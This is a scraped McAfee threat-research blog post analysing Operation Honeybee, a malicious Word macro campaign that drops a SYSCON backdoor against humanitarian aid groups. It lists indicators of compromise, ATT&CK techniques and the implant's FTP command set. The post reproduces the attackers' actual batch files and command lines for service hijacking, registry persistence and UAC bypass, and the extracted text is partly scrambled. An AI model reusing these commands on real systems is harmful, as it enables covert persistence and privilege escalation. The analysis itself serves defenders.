{
    "title": "mcafee uncovers operation honeybee_ a malicious document campaign targeting humanitarian aid groups _ mcafee blogs",
    "text": "McAfee Uncovers Operation\nHoneybee, a Malicious Document\nCampaign Targeting Humanitarian Aid\nGroups\nLbAedd Hnld\nSecuring Tomorrow\n\n\n\n\nUnited States / English     Privacy Legal Notices Legal Contracts & Terms Site Map Copyright ©20202019 McAfee, LLC   Home/OtherBlogs /McAfeeLabs /McAfeeUncoversOperationHoneybeeaMaliciousDocumentCampaignTargetingHumanitarianAidGroups\n By Ryan Sherstobito  on Mar 02, 2018\nThis post was written with contributions from Jessica Saavedra-Morales, Thomas Roccia, and Asheer Malhotra. \nMcAfee Advanced Threat Research analysts have discovered a new operation targeting humanitarian aid organizations and using North\nKorean political topics as bait to lure victims into opening malicious Microsoft Word documents. Our analysts have named this\nOperation Honeybee, based on the names of the malicious documents used in the attacks.\nAdvanced Threat Research analysts have also discovered malicious documents authored by the same actor that indicate a tactical shift.\nThese documents do not contain the typical lures by this actor, instead using Word compatibility messages to entice victims into\nopening them.\nThe Advanced Threat Research team also observed a heavy concentration of the implant in Vietnam from January 15–17.\nBackground\nOn January 15, Advanced Threat Research discovered an operation using a new variant of the SYSCON backdoor.  The Korean-language\nWord document manual.doc appeared in Vietnam on January 17, with the original author name of Honeybee.\nDocument properties.\nThis malicious document contains a Visual Basic macro that dropped and executed an upgraded version of the implant known as\nSYSCON, which appeared in 2017 in malicious Word documents as part of several campaigns using North Korea–related topics. The\nmalicious Visual Basic script uses a unique key (custom alphabet) to encode data. We have seen this in previous operations using\nSYSCON. This key was also used in the Honeybee campaign and appears to have been used since August 2017.\nExamples of decoy documents.\nSeveral additional documents surfaced between January 17 and February 3. All contain the same Visual Basic macro code and author\nname as Honeybee. Some of the malicious documents were test  les without the implant. From our analysis, most these documents\nwere submitted from South Korea, indicating that some of the targeting was in South Korea. These Honeybee documents did not\ncontain any speci c lures, rather variations of a “not compatible” message attempting to convince the user to enable content.\nWe also observed a related malicious document created January 12 by the author Windows User that contained a di erent encoding\nkey, but essentially used the same macro and same type of implant as we saw with the recent Honeybee documents. This document,\n“International Federation of Red Cross and Red Crescent Societies – DPRK Country O ce,” drops an implant with the control server\naddress 1113427185.ifastnet.org, which resolves to the same server used by the implants dropped in the Honeybee case.\nThe directory contents of control server 1113427185.ifastnet.org.\nThe directory contents of ftp.byethost11.com, from Honeybee samples.\n \nLog  les of compromised machines from February 2018 Honeybee samples.\nMaoCheng Dropper\nAside from  nding the malicious documents, the Advanced Threat Research team discovered a Win32-based executable dropper. This\ndropper uses a stolen digital signature from Adobe Systems. This certi cate is also used by another Korean-language malware\ncompiled January 16 (hash: 35904f482d37f5ce6034d6042bae207418e450f4) with an interesting program database (PDB) path.\nD:\\Task\\DDE Attack\\MaoCheng\\Release\\Dropper.pdb\nThe malware is a Win32 executable that pretends to be a Word document based on its icon. This is a dropper for the same type of\nmalware as observed with the other Word documents. This sample also dropped a decoy document with the author name Honeybee.\nThis sample, however, contained a bug that interfered with the execution  ow of the dropper, suggesting that the authors did not test\nthe malware after code signing it.\nThe decoy document uses the cloud-based accounting software company Xero as a lure:\nA decoy document from MaoCheng dropper.\nPossible Operator\nThe Advanced Threat Research team has identi ed the following persona (snoopykiller@mail.ru) tied to this recent operation. Based on\nour analysis, the actor registered two free hosting accounts: navermail.byethost3.com, which refers to the popular South Korean\nsearch engine, and nihon.byethost11.com. The email address was used to register a free account for a control server in all the implants\ndescribed in our analysis.  \nTechnical Analysis\nLet’s start with an overview of the attack:\nWe continue with the components involved in this operation.\nThe malicious Word  le is the beginning of the infection chain and acts as a dropper for two DLL  les. The Word  le contains malicious\nVisual Basic macro code that runs when the document is opened in Word using the Document_Open() autoload function. The word  le\nalso contains a Base64-encoded  le (encoded with a custom key) in it that is read, decoded, and dropped to the disk by the macro.\nThe Document_Open() subroutine implementing the malicious functionality.\nThe Visual Basic macro performs the following tasks:\nEncoded CAB  le in the Word document.\nDecoding and writing the CAB  le to %temp%.\nThe decoded CAB  le in the Visual Basic memory bu er.\nThe CAB  le contains the following  les and functions:\nDecoded credential data contained in ipnet.ini.  \ncmd /c wusa %TEMP%\\setup.cab /quiet /extract:%SystemRoot%\\System32 && del /f /q %TEMP%\\setup.cab && cliconfg.exe\ncmd /c expand %TEMP%\\setup.cab -F:* %SystemRoot%\\System32 && del /f /q %TEMP%\\setup.cab && cliconfg.exe\nA combination of NTWDBLIB.dll and cliconfg.exe are used to bypass UAC protections; this is a familiar attack on Windows. UAC bypass\nvia DLL hijacking requires:\nThe malicious NTWDBLIB DLL performs the simple task of setting up the malicious ipnet.dll as a service by running one of the two batch\n les contained in the CAB  le (which is also dropped to %systemroot%\\system32):\nNTWDBLIB executing the installer batch  les under the context of cliconfg.exe.  \nThe batch  les involved in the attack modify the system service COMSysApp to load the malicious ipnet.dll. The contents of the batch\n les vary depending on the OS (x64 vs x86):\ninstall1.bat (x64)\n@echo off\nsc stop COMSysApp\nsc config COMSysApp type= own start= auto error= normal binpath= \"%windir%\\SysWOW64\\svchost.exe -k COMSysApp\"\nreg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SvcHost\" /v COMSysApp /t REG_MULTI_SZ /d \"COMSysApp\" /f\nreg add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\COMSysApp\\Parameters\" /v ServiceDll /t REG_EXPAND_SZ /d \"%windir%\\SysWOW64\\ ipnet.dll \" /f\nsc start COMSysApp\ndel /f /q %windir%\\SysWOW64\\install2.bat\ndel /f /q %windir%\\SysWOW64\\install1.bat\ninstall2.bat (x86)\n@echo off\nsc stop COMSysApp\nsc config COMSysApp type= own start= auto error= normal binpath= \"%windir%\\System32\\svchost.exe -k COMSysApp\"\nreg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SvcHost\" /v COMSysApp /t REG_MULTI_SZ /d \"COMSysApp\" /f\nreg add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\COMSysApp\\Parameters\" /v ServiceDll /t REG_EXPAND_SZ /d \"%windir%\\system32\\ ipnet.dll \" /f\nsc start COMSysApp\ndel /f /q %windir%\\System32\\install1.bat\ndel /f /q %windir%\\System32\\install2.bat\nThe batch  les perform these tasks:\nIPNet.dll runs as a service under svchost.exe.\nThe malicious DLL is also responsible for terminating the cliconfg.exe process and deleting the malicious NTWDBLIB.dll using:\ncmd /c taskkill /im cliconfg.exe /f /t && del /f /q NTWDBLIB.DLL\nAll the following capabilities described are implemented by the malicious service DLL implant unless speci ed.   \nVariant using North Korean Red Cross\nAnother variant (hash: 9e2c0bd19a77d712055ccc0276fdc062e9351436) of the malicious Word dropper uses the same Base64-decoding\nscheme with a di erent custom key. This document was created January 10.\nContents of the decoy document.\nThis variant also consists of two CAB  les that are dropped to %temp%, depending on the OS (x86 or x64).\nThe key di erences in this variant:\ncmd /c expand %TEMP%\\setup.cab -F:* %TEMP% && cd /d %TEMP% && del /f /q setup.cab && uacme.exe\nDecoded credential data contained in another ipnet.ini.\nSimilarities between this variant and the original malware sample:\nData Reconnaissance\nThe following information is gathered from the endpoint and sent to the control server.\nExfiltration\nFrom <COMPUTER-NAME> (<Month>-<Day> <Hour>-<Minute>-<Second>).txt. For example, From <COMPUTER-NAME> (01-04 11-40-\n02).txt\nAdditional Commands and Capabilities\nThe service-based DLL implant traverses to the /htdocs/ directory on the FTP server and looks for any  les with the keywords:\nThe following commands are supported by the malware implant:\nConclusion  \nThe actor behind Honeybee has been operating with new implants since at least November 2017 with the  rst known version of\nNTWDBLIB installer. Furthermore, based on the various metadata in both documents and executables, the actor is likely a Korean\nspeaker.\nThe techniques used in the malicious documents such as the lure messages closely resemble what we have observed before in South\nKorea. The attacker appears to target those involved in humanitarian aid and inter-Korean a airs. We have seen this operation expand\nbeyond the borders of South Korea to target Vietnam, Singapore, Argentina, Japan, Indonesia, and Canada.\nBased on the McAfee Advanced Threat Research team’s analysis, we  nd multiple components from this operation are unique from a\ncode perspective, even though the code is loosely based on previous versions of the SYSCON backdoor. Some new droppers have not\nbeen observed before in the wild. The MaoCheng dropper was apparently created speci cally for this operation and appeared only\ntwice in the wild.\n \nIndicators of compromise\nMITRE ATT&CK techniques\nHashes\nDomainsOpens a handle to the malicious document to read the encoded CAB  le\nDecodes the CAB  le and writes it to the disk at %temp%\\setup.cab\ndll: A malicious DLL used to launch batch  les (used with cliconfg.exe for UAC bypass). The DLL contains the following PDB path:\nD:\\Task\\MiMul\\NTWDBLIB\\Release\\NTWDBLIB.pdb.\nbat: A batch  le to set up the service COMSysApp, for an x64 system\nbat: A batch  le to set up the service COMSysApp, for an x86 system\nini: A data  le with Base64-encoded data for connecting to an FTP server. Credentials are encoded in the .ini  le.\ndll: The malicious DLL  le run as a service (using svchost.exe). The DLL contains the following PDB path:\nD:\\Task\\MiMul\\FTPCom_vs10\\Release\\Engine.pdb.\nThe macro then extracts the CAB  le into %systemroo%\\system32, using either wusa.exe or expand.exe (depending on the OS) to\nagain bypass UAC prompts\nOnce the  les have been extracted, the Visual Basic macro deletes the CAB  le and runs the malicious NTWDBLIB.dll via cliconfg.exe\n(to gain privileges and bypass UAC protections)\nCommand lines used by the Visual Basic macro:\nA Windows executable with the auto-elevate property in its manifest\nA Windows executable in a secure directory (%systemroot%\\system32)\nStop the service COMSysApp\nCon gure the service to autostart (to set up persistence on the system)\nModify registry keys to launch the DLL unser svchost.exe\nSpecify the malicious DLL path to be loaded into the svchost process.\nImmediately restart the service\nRemove the batch  les to reduce the  ngerprint on the system  \nTwo CAB  les are encoded into the Word document in text boxes instead of being appended in the DOC  le\nThere is one CAB  le for an x86 system and another for an x64 system\nThis malware sample uses uacme.exe with dummy.dll to implement the UAC bypass\nexe is the program vulnerable to the UAC bypass attack\ndll runs install.bat to set up the service (same as NTWDBLIB.dll)\nexe and dummy.dll may be either 64-bit or 32-bit binaries based on the OS. Ipnet.dll may also be either 64-bit or 32-bit.\nThe Visual Basic macro uses the following command line:\nThe control server credential information contained in the CAB  les is di erent:\nService name is the same: COMSysApp\nThe DLL and ini  les contain the same functions as described elsewhere in this post\nSystem info:\nComputer name\nSystem info using: cmd /c systeminfo >%temp%\\temp.ini\nList of currently running process using: cmd /c tasklist >%temp%\\temp.ini\nThe data ex ltration process runs in the following sequence: The temp.ini  les are copied into a text  le that matches the pattern:\nAll the text  les are now packed into the archive temp.zip (%temp%\\temp.zip)\nzip is Base64 encoded (with a custom key, same as that used in the malicious document) and then copied to post.txt\ntxt is uploaded to the control server\nTO EVERYONE: Commands issued to all infected endpoints\nTO <COMPUTERNAME>: Commands issued to endpoints matching the ComputerName\ncmd /c pull < lename>: Adds  lename to temp.zip, Base64 encodes, and uploads to control server\ncmd /c chip <string>: Deletes current ipnet.ini con g  le. Writes new con g info (control server connection info) to new ipnet.ini.\ncmd /c put <new_ le_name> <existing_ le_name>: Copies existing  le to new  le name. Deletes existing  le.\n/user <parameters>: Executes downloaded  le with parameters speci ed using CreateProcessAsUser\ncmd /c <command>: Executes command on infected endpoint  \nModify existing service\nCode signing\nFile deletion\nDeobfuscate/decode  les or information\nSystem information discovery\nProcess discovery\nService execution\nRunDLL32\nScripting\nCommand-line Interface\nData from local system\nAutomated ex ltration\nData encrypted\nCommonly used port\nBypass user account control\nfe32d29fa16b1b71cd27b23a78ee9f6b7791b 3\nf684e15dd2e84bac49ea9b89f9b2646dc32a2477\n1d280a77595a2d2bbd36b9b5d958f99be20f8e06\n19d9573f0b2c2100accd562cc82d57adb12a57ec\nf90a2155ac492c3c2d5e1d83e384e1a734e59cc0\n9b832dda912cce6b23da8abf3881fcf4d2b7ce09\nf3b62fea38cb44e15984d941445d24e6b309bc7b\n66d2cea01b46c3353f4339a986a97b24ed89ee18\n7113aaab61cacb6086c5531a453adf82ca7e7d03\nd41daba0ebfa55d0c769ccfc03dbf6a5221e006a\n25f4819e7948086d46df8de2eeeaa2b9ec6eca8c\n35ab747c15c20da29a14e8b46c07c0448cef4999\ne87de3747d7c12c1eea9e73d3c2fb085b5ae8b42\n0e4a7c0242b98723dc2b8cce1fbf1a43dd025cf0\nbca861a46d60831a3101c50f80a6d626fa99bf16\n01530adb3f947fabebae5d9c04fb69f9000c3cef\n4229896d61a5ad57ed5c247228606ce62c7032d0\n4c7e975f95ebc47423923b855a7530af52977f57\n5a6ad7a1c566204a92dd269312d1156d51e61dc4\n1dc50bfcab2bc80587ac900c03e23afcbe243f64\n003e21b02be3248 72cc2bfcd05bb161b6a2356\n9b7c3c48bcef6330e3086de592b3223eb198744a\n85e2453b37602429596c9681a8c58a5c6faf8d0c\nftp.byethost31.com\nftp.byethost11.com\n1113427185.ifastnet.org\nnavermail.byethost3.com\nnihon.byethost3.com\nAbout the Author\n\nRyan Sherstobito \nRyan Sherstobito  is a Senior Analyst for Major Campaigns – Advanced Threat Research in McAfee. Ryan\nspecializes in threat intelligence in the Asia Paci c Region where he conducts cutting edge research into new\nadversarial techniques and adapts those to better monitor the threat landscape. He formerly was the Chief\nCorporate Evangelist at Panda Security, where ...\nRead more posts from Ryan Sherstobito  \n Previous Article Next Article \nCategories: McAfee Labs\nTags: malware, advanced persistent threats , Phishing, cybersecurity , Advanced Threat Research\nLeave a reply\nFacebook Comments Comments (0)\nSimilar Blogs\nWhatsApp Security Hacks: Are\nYour ‘Private’ Messages Really\nEver Private?\nMar 14, 2020\nIs WhatsApp Safe for Kids? Here’s\nWhat Parents Need to Know\nMar 07, 2020\nIs Mobile Malware Playing Hide\nand Steal on Your Device?\nMar 03, 2020\nFamily Safety\n Family Safety\n Consumer\nSubscribe to McAfee Securing Tomorrow Blogs\nEmail address  Subscribe Search Blogs Blog Home Categories Authors Subscribe\nFor Home For Enterprise \n "
}